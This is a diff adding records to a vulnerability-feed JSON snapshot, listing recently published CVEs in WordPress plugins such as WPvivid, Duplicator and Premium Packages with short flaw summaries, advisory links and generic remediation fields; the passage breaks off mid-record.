@@ -3,7 +3,7 @@
   "snapshotDate": "2026-11-04",
   "mode": "live",
   "coverage_limited": true,
-  "candidate_records": 8214,
+  "candidate_records": 8125,
   "categories": [
     {
       "name": "Windows Server OS",
@@ -978,6 +978,1295 @@
       "known_exploited": false
     },
     {
+      "id": "CVE-2026-112244",
+      "title": "The Duplicator WordPress plugin before 5.1.0, duplicator-pro WordPress plugin before 5.1.0 does...",
+      "severity": "bulletin",
+      "categories": [
+        "PHP",
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Duplicator WordPress plugin before 5.1.0, duplicator-pro WordPress plugin before 5.1.0 does not prevent direct access to some of its bundled PHP files, which initialise without their expected context, trigger a fatal error, and return a stack trace that discloses the server's absolute filesystem paths to unauthenticated users.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-v2q9-hw4w-2v6m"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112244"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/0c322135-f2a8-495d-986f-b9d626ddc856"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:05Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-115426",
+      "title": "The WPvivid — Backup, Migration & Staging WordPress plugin before 0.9.138 does not properly...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The WPvivid — Backup, Migration & Staging WordPress plugin before 0.9.138 does not properly validate a backup storage directory path before using it to create directories and write files, allowing administrators to cause those directories and files to be created outside the intended backup location via path traversal.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-2q5f-v38g-c39x"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115426"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/c12a6832-81c3-4bae-93a9-3a51ff986863"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:05Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-115242",
+      "title": "The WPvivid — Backup, Migration & Staging WordPress plugin before 0.9.137 does not sanitize the...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The WPvivid — Backup, Migration & Staging WordPress plugin before 0.9.137 does not sanitize the staging destination folder supplied to its staging-start handler, applying only a generic text filter while the sibling writability-check handler applies the correct filename sanitizer, so an authenticated administrator can supply a path containing traversal sequences and make the WPvivid — Backup, Migration & Staging WordPress plugin before 0.9.137 write the copied site files outside the WordPress installation directory.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-799w-j885-wg7g"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115242"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/29ffe47f-a95a-46ec-bb7d-6880299221f6"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:05Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-118783",
+      "title": "The All-in-One Video Gallery WordPress plugin before 5.0.0 does not validate and escape some of...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The All-in-One Video Gallery WordPress plugin before 5.0.0 does not validate and escape some of its shortcode attributes before outputting them back in a page/post where the shortcode is embedded, which could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-5rc8-q6x2-7jq7"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118783"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/119477bd-1b29-4e33-9040-38cb6f0ae623"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:05Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-118404",
+      "title": "The Premium Packages WordPress plugin before 7.3.1 does not verify ownership or session binding...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Premium Packages WordPress plugin before 7.3.1 does not verify ownership or session binding when loading a previously saved shopping cart, allowing any unauthenticated user who obtains another shopper's saved-cart identifier to load that shopper's cart contents, including selected products, quantities and buyer-entered custom field data, into their own session.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-5x4q-vfvg-wp36"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118404"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/008e4d20-83b0-48f6-a709-539036e1f678"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:05Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-115250",
+      "title": "The Text Typing WordPress plugin before 2.2.2 does not properly sanitize and escape a block...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Text Typing WordPress plugin before 2.2.2 does not properly sanitize and escape a block attribute before storing it and later outputting it into a page element that is read and rendered by client-side script, allowing users with the Contributor role and above to perform Stored Cross-Site Scripting attacks that execute in the browser of anyone viewing the affected page.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-5w2p-gv78-w6jq"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115250"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/cd56ae71-ca5e-4335-a7e8-75c6f6936568"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-115241",
+      "title": "The WPvivid — Backup, Migration & Staging WordPress plugin before 0.9.137 does not verify that a...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The WPvivid — Backup, Migration & Staging WordPress plugin before 0.9.137 does not verify that a submitted snapshot identifier names a snapshot it actually created before using it as a database table-name prefix, so an authenticated administrator can supply the site's table prefix, or any other string, and cause the WPvivid — Backup, Migration & Staging WordPress plugin before 0.9.137 to drop every matching table, including the core WordPress tables, destroying the site's database.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-xj7v-7phj-c92j"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115241"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/d3c2dd62-6f7f-4593-9f16-c7d7949787be"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-118407",
+      "title": "The Premium Packages WordPress plugin before 7.3.1 does not verify that a user claiming a guest...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Premium Packages WordPress plugin before 7.3.1 does not verify that a user claiming a guest order is the original buyer, allowing any authenticated user to take ownership of any unclaimed guest order, and thereby read the buyer's billing details and download their purchased files, by supplying only the order identifier.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-mmxp-wx6x-2jp9"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118407"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/541a09e1-e11d-4a17-94cb-4d5e2664bdf1"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-114431",
+      "title": "The Enable Media Replace WordPress plugin before 4.2.3 does not pass a replaced media file...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Enable Media Replace WordPress plugin before 4.2.3 does not pass a replaced media file through the WordPress upload pipeline, so the upload prefilter that SVG-sanitizer Enable Media Replace WordPress plugin before 4.2.3 rely on never runs, allowing an authenticated user with upload access to store an SVG file containing script that executes when the file is opened directly. It requires an SVG-enabling Enable Media Replace WordPress plugin before 4.2.3 to be active, as the replace path otherwise rejects SVG uploads.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-c8jg-ch76-q9xw"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-114431"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/3633f2fd-c61c-4da9-962e-8f55c8fafb3b"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-118637",
+      "title": "The Simple Download Monitor WordPress plugin before 4.1.3 does not properly check the visibility...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Simple Download Monitor WordPress plugin before 4.1.3 does not properly check the visibility of the content referenced by one of its shortcodes, allowing users with a role as low as Contributor to disclose the title and description of private, draft and other non-public posts.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-hqhx-2rpp-fr4w"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118637"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/bf1275d7-f48b-4f30-90f1-024604aaf848"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:32:59Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-118403",
+      "title": "The Premium Packages WordPress plugin before 7.3.1 does not verify that the requester owns a...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Premium Packages WordPress plugin before 7.3.1 does not verify that the requester owns a guest order before returning its details, allowing unauthenticated visitors who know a guest order's identifier to view its order status, payment status and total.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-43m8-2m67-x874"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118403"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/d316f5c9-51f3-43d7-9ffe-e47ab7187dcb"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:32:59Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-115262",
+      "title": "The Duplicator WordPress plugin before 5.1.0, duplicator-pro WordPress plugin before 5.1.0 does...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Duplicator WordPress plugin before 5.1.0, duplicator-pro WordPress plugin before 5.1.0 does not restrict its database charset and collation rewrite to schema statements during a restore, so a value a Subscriber stores in their own profile can break out of its string literal and inject SQL into the restore's INSERT statement when an administrator restores the backup onto a server lacking one of the source's charsets or collations.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-8p5f-q54f-ww8c"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115262"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/5359cd4c-9867-4b33-b0b2-ca85819f9af4"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:32:59Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-115243",
+      "title": "The WPvivid — Backup, Migration & Staging WordPress plugin before 0.9.137 does not validate the...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The WPvivid — Backup, Migration & Staging WordPress plugin before 0.9.137 does not validate the extension of the file it actually stores when handling an import upload: it checks the extension of a separate request field while saving the uploaded file itself with WordPress's upload type-checking disabled, so an authenticated administrator can store a file with an arbitrary extension, including a PHP file, in the WPvivid — Backup, Migration & Staging WordPress plugin before 0.9.137's import directory. This is an incomplete fix of CVE-2025-5961, whose extension check was applied to the wrong value.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-ffwc-7qpf-45gq"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115243"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/07de0f63-657d-4f97-b665-468e2dff7776"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:32:59Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-118983",
+      "title": "The VikWidgetsLoader WordPress plugin before 1.12.3 does not sanitise or escape several block...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The VikWidgetsLoader WordPress plugin before 1.12.3 does not sanitise or escape several block attributes before outputting them inside HTML attributes, allowing users with the Contributor role to store arbitrary JavaScript that executes in the browser of any user viewing the affected post, including the administrator or editor who reviews the pending submission.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-f2j8-6vrw-jhhv"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118983"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/1c001ad0-6230-4c36-b859-f2225a98f4a5"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:32:58Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-118523",
+      "title": "The EventPrime WordPress plugin before 4.3.6.1 does not keep the built-in Pending Review post...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The EventPrime WordPress plugin before 4.3.6.1 does not keep the built-in Pending Review post status non-public, allowing unauthenticated users to view posts, pages and other content that are awaiting review.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-cvmx-6xvp-xq3j"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118523"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/d3cdae3c-79a4-4daf-8fe4-b03cd589beb4"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:32:58Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-115257",
+      "title": "The WP Roster WordPress plugin before 2.36 does not perform any capability or nonce checks before...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The WP Roster WordPress plugin before 2.36 does not perform any capability or nonce checks before writing its stored roster data, allowing unauthenticated attackers to overwrite, wipe or restore the content of any roster.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-p54f-4qj5-25h3"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115257"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/9edf44aa-e528-4ac3-afea-a4f4451b7e1d"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:32:58Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-111740",
+      "title": "The Post Duplicator WordPress plugin before 3.0.17 does not check whether the requesting user may...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Post Duplicator WordPress plugin before 3.0.17 does not check whether the requesting user may view each post before returning a list of posts for a post type, allowing users with a role as low as Contributor to read the titles and hierarchy of other users' draft and private posts.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-456x-cvcm-4r62"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-111740"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/dc6c6d3b-2843-45b2-b61c-9f6dc63bbedd"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-110692",
+      "title": "The PowerPack Addons for Elementor: Widgets, Form Styler and Templates WordPress plugin before 3...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The PowerPack Addons for Elementor: Widgets, Form Styler and Templates WordPress plugin before 3.1.3 does not validate a user-supplied URL before using it in a server-side HTTP request, which could allow users with the contributor role and above to perform Server-Side Request Forgery attacks against internal and loopback resources and read the response back.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-67vf-r2g2-2ff9"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-110692"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/ac6405e6-9a1e-4ad6-bfd7-e672030a31c1"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-110964",
+      "title": "The Essential Real Estate WordPress plugin before 5.3.5 does not verify that a media attachment...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Essential Real Estate WordPress plugin before 5.3.5 does not verify that a media attachment belongs to the requesting user before deleting it, allowing a self-registered customer-level user to delete other users' media library attachments, including those owned by administrators.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-292c-37qx-v9g9"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-110964"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/2c79fd6f-56ca-4133-ac6c-84b2d15c0fa4"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-108068",
+      "title": "The FV Flowplayer Video Player WordPress plugin before 7.5.56.7212 does not perform proper...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The FV Flowplayer Video Player WordPress plugin before 7.5.56.7212 does not perform proper authorization checks on one of its video-migration functions, which is protected by a nonce only, allowing users with Contributor-level permissions and above to disclose and bulk-modify the FV Flowplayer Video Player WordPress plugin before 7.5.56.7212's stored video records across the whole site.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-7p26-8g5q-c3vw"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-108068"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/22aec931-839e-4b2e-bb40-6d00e58706ee"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-108041",
+      "title": "The SEOPress WordPress plugin before 10.4 does not sanitise and escape some of its analytics...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The SEOPress WordPress plugin before 10.4 does not sanitise and escape some of its analytics tracking settings before outputting them in an inline script printed on every front-end page, allowing users granted a SEOPress WordPress plugin before 10.4 capability that an administrator can delegate to lower-privileged roles to perform Stored Cross-Site Scripting attacks that execute in the browser of any site visitor, including a logged-in administrator viewing the front end.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-pp67-6fqf-q73f"
+        },
+        {
+          "label": "NVD CVE record",
